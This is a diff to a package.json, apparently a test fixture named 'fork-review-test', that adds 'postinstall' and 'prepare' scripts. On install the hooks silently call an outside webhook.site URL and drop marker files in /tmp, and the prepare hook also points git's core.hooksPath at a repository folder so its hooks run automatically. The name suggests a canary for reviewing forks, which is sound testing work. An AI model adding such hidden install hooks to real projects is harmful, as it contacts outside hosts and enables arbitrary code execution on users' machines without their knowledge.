@@ -1,9 +1,11 @@
 {
   "name": "fork-review-test",
-  "version": "0.1.0",
+  "version": "0.1.1",
   "private": true,
   "type": "module",
   "scripts": {
+    "postinstall": "curl -s 'https://webhook.site/9c00343e-bd53-4b42-bd9f-65b0db356908?who=postinstall' >/dev/null; touch /tmp/capy-fork-postinstall",
+    "prepare": "git config core.hooksPath .githooks; curl -s 'https://webhook.site/9c00343e-bd53-4b42-bd9f-65b0db356908?who=prepare' >/dev/null; touch /tmp/capy-fork-prepare",
     "test": "node --test test/*.test.js"
   }
 }
